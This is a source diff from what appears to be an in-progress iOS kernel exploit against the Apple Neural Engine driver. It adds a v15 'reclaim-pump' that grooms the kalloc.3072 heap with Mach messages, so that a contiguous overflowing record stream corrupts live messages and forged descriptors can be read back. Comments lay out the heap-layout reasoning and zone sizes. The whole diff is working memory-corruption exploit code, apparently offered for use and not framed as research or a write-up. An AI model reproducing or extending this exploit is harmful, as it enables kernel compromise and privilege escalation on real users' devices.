@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v14-triclass"
+#define P099_BUILD @"p099-aneprewire-v15-reclaim"
 
 #define P099_INPUT_COUNT 254
 /* v13 INTERLEAVE LAW (the 21:38/21:40 v12 MAF rounds): the fill's crossing
@@ -51,7 +51,18 @@
    now cover all three observed buckets by i%3: i%3==0 → the runtime ANE
    class (0x7fc = kalloc.3072), i%3==1 → 0x7b0 (kdata 0x7d4 = kalloc.2048),
    i%3==2 → 0x5d8 (kdata 0x5fc = kalloc.1536). Half-drain interleave law
-   unchanged. */
+   unchanged.
+   v15 (MAF #8/#9/#10 = ALL kalloc.3072 / rec0xc0 with the interleave
+   RUNNING): the record stream is CONTIGUOUS (255 recs = 0xFF0 bytes) —
+   it plows through EVERY element physically downstream of the record-
+   area element, so any free slots downstream = MAF fodder. With 1024
+   interleaved free slots the MAF wins nearly always. THE LAW: the free
+   list at fill time must be TINY and not the record area's physical
+   neighborhood — RECLAIM all but the top-8 (LIFO) freed slots with
+   door-shaped kmsgs on the SAME odd-hole ports (the resend pops the
+   freed slot back live); the ANE's ~3-4 pops then come from the top-8
+   group and the stream downstream = LIVE door kmsgs = no MAF, the
+   round SURVIVES, and the door readback reads the forged descs. */
 #define P099_MSG_2048_WIRE 0x7b0
 #define P099_MSG_1536_WIRE 0x5d8
 #define P099_OUTPUT_COUNT 1
@@ -531,6 +542,21 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
             for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
                 if ((i & 1) && pairs[i].hole && p099_recv_payload(pairs[i].hole, NULL) == MACH_MSG_SUCCESS) holesFreed++;
             }
+            /* v15 RECLAIM-PUMP: resend a door msg to every drained odd-hole
+               port EXCEPT the top-8 LIFO ranks — frees stay tiny and out of
+               the stream's path; everything downstream of the record area's
+               element = LIVE door kmsgs. */
+            {
+                uint32_t reclaimed = 0, kept = 8u;
+                for (uint32_t i = 0; i < P099_PAIR_COUNT; i++) {
+                    if (!(i & 1) || !pairs[i].hole) continue;
+                    if ((i >> 1) >= (P099_PAIR_COUNT >> 1) - kept) continue;  /* top-k stay free */
+                    if (p099_send_portkind_victim(pairs[i].hole, i)) reclaimed++;
+                }
+                if (g_p099_portkindN == P099_PAIR_COUNT)
+                    L(@"[v15] reclaim-pump: %u freed slots re-claimed with door kmsgs (kept=%u free = the ANE's pop set)",
+                      reclaimed, kept);
+            }
         }
         sync();
         L(@"[*] groom: drain=%d/%d pairs=%d/%d holes-freed=%d (v13 half-drain: odd holes only; even holes = DOOR msgs in flight)",
@@ -723,7 +749,10 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 if (!pairs[i].victim) continue;
                 if (g_p099_portkindN && i >= P099_PAIR_COUNT - g_p099_portkindN) {
                     /* v6 door round: the desc readback IS the conversion verdict;
-                       door rounds do not consume the payload-diff budget */
+                       door rounds do not consume the payload-diff budget. v15:
+                       the reclaimed odd-hole ports hold the pump's door msgs —
+                       read them through the same door law. */
+                    if ((i & 1) && pairs[i].hole) p099_recv_portkind_door(pairs[i].hole, i);
                     p099_recv_portkind_door(pairs[i].victim, i);
                     continue;
                 }
